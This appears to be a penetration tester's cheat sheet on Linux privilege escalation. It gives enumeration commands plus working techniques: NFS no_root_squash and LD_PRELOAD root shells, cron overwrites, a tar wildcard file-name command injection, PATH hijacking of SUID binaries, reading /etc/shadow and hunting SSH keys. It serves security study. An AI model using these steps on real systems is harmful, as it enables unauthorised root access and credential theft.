# Linux Privilege Escalation

### Table of Contents

0. [Upgrade Shell](#upgrade-shell)
1. [System Enumeration](#system-enumeration)
2. [User Enumeration](#user-enumeration)
3. [Network Enumeration](#network-enumeration)
4. [Password Hunting](#password-hunting)
5. [Automated Tools](#automated-tools)
6. [Additional Sources](#additional-sources)

### Upgrade Shell

If python is installed then the following command will upgrade the current shell to a bash shell. This can be necessary to run `linpeas.sh` successfully.

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### System Enumeration

**Hostname**

```sh
hostname
```

**Kernel Version**

```sh
uname -a
cat /proc/version
```

**Linux Distribution**

```sh
cat /etc/issue
```

**CPU Architecture**

```sh
lscpu
```

**Running Services**

```sh
ps aux
ps aux | grep root
```

**no_root_squash**

We can check if a directory has the value `no_root_squash` using the following command. If the folder has been misconfigured with the value `no_root_squash` then we can mount that directory and run commands as `root`.

Example output:

`/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)`

```sh
cat /etc/exports

mkdir /tmp/mountme
sudo mount -o rw,vers=2 <IP>:/tmp /tmp/mountme

echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/exploit.c
gcc /tmp/mountme/exploit.c -o /tmp/mountme/exploit
./exploit
```

### User Enumeration

**Current User**

```sh
whoami
```

**Groups**

```sh
id
```

If any of the following groups appear then they can be exploited:
- `root`
- `sudo/admin/wheel`
- `video`
- `disk`
- `shadow`
- `adm`
- `docker`
- `LXC/LXD`

> https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/

**Unrestricted Access**

Check if our current user has write access to `/etc/passwd` to potentially add a new user to switch to

```sh
ls -la /etc/passwd
```

Check if our current user has access to the `/etc/shadow` file which should be restricted. If so we can try to crack the hash offline

```sh
cat /etc/shadow
```

Check if our current user has access to the `/etc/group` file

```sh
cat /etc/group
```

**History**

```sh
history
```

**Switch to Root**

```sh
sudo su
```

**Check your Surroundings**

Make sure to check the file system for files that look interesting with `ls -la`. Look for configuration files, SSH files, or bash history for potential leaked credentials. You can use `john` to try to crack the SSH file.

**Sudo Privileges**

Show all of the binaries that can be run as sudo without a password.

```
sudo -l
```

Compare the output to the website GTFOBins that shows known exploitation methods for common binaries

<https://gtfobins.github.io/>

**Sudo Privileges via Intended Functionality**

Just because a binary doesn't show up in GTFOBins, it may have intended functionality that can be exploited. For example, in Apache is can be used to read files with escalated privileges.

**Sudo Privileges via LD_PRELOAD**

After running the command `sudo -l` if the output contains `LD_PRELOAD` it can be exploited with a short script to escalate privileges. 

```
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD
```

Create a new C file with the following code

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

Then compile the code and use another binary we have sudo privileges for to escalate

```
gcc -fPIC -shared -o /tmp/x.so preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so apache2
```

**SUID**

Run the following command to find binaries with the SUID bit enabled

```
find / -type f -perm -04000 -ls 2>/dev/null
```

Search the binaries against GTFOBins to find known exploits

<https://gtfobins.github.io/#+suid>

**Capabilities**

Run the following command to find binaries that have sudo capabilities

```
getcap -r / 2>/dev/null
```

There are some binaries that can be exploited if they have sudo capabilities. Using GTFOBins is a good resource

> https://gtfobins.github.io/#+capabilities

**Cron Paths**

We can check for scheduled cron jobs using the following command:

```
cat /etc/crontab
```

If these are running as `root` and we have write access to the job, we can potentially inject our own malicious code. Use `ls -la` on the cronjob to see if we can overwrite it

For example:

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
```

After waiting a minute for the script to run we can run `/tmp/bash -p` to escalate our privileges.

```
/tmp/bash -p
```

**Cron Wildcards**

If we do not have write access to the script, it may contain code that we can exploit. For example, printing the script will show that it is running a `tar` command with a wildcard.

```
cat /usr/local/bin/compress.sh
```

We can create a shell script in the directory that will be picked up by the `tar` command.

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
chmod +x runme.sh
```

The following commands need to be run for `tar` to execute the script. The first command adds a checkpoint and when that checkpoint is reached it will execute our script.

```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\runme.sh
```

After waiting a minute we should be able to escalate our privileges.

```
/tmp/bash -p
```

**Cronjobs via pspy**

Sometimes the cronjobs may not be viewable. In this case use the tool called `pspy64` to see commands being run by other users, cron jobs, etc as they execute.

> https://github.com/DominicBreuker/pspy

**Path**

Check if there are any directories in the PATH we can exploit

```
echo $PATH
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

**Path via SUID**

We can potentially exploit the PATH variable to run malicious code. After running `sudo -l` print the binary out with `strings` to see if anything can be exploited.

For example this binary uses the command `service` which we can create our own binary and add it to PATH for privilege escalation. 

```
strings /usr/local/bin/<binary>
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c`
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/<binary>
```

Another example if the binary uses a direct path it can exploited like so

```
strings /usr/local/bin/suid-env2
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

### Network Enumeration

**Connections**

Check for network connections as there may be multiple networks that the device is connected to

```
ifconfig
ip a
ip route
arp -a
ip neigh
```

Check which ports are open. Are there other active connections that we can exploit? Are there open ports internally that the `nmap` scan didn't find?

```
netstat ano
```

### Password Hunting

**Searching for strings**

It is possible to check for instances of a word to potentially find passwords. This will find a lot of false positives but we can change the string as needed.

```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
```

**Searching for files**

It is possible to search for files containing the string `password` to potentially obtain sensitive information. This string can be changed to search for other files.

```
locate password | more
```

We can look for common files such as SSH keys

```
find / -name id_rsa 2> /dev/null
find / -name authorized_keys 2> /dev/null
```

### Exploring Automated Tools

**LinPEAS**

This tool can be run from the web using `curl` or copied from the attack machine to the target machine. Once copied it needs to be made executable with `chmod +x` and then can be run.

<https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md>

```
./linpeas.sh
```

**LinEnum**

An alternative to LinPEAS if nothing useful is found.

<https://github.com/rebootuser/LinEnum>

```
./linenum.sh
```

**LinuxExploitSuggester**

This script searches for exploits that the target machine is vulnerable to

```
./linux-exploit-suggester.sh
```

### Additional Sources

<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md>
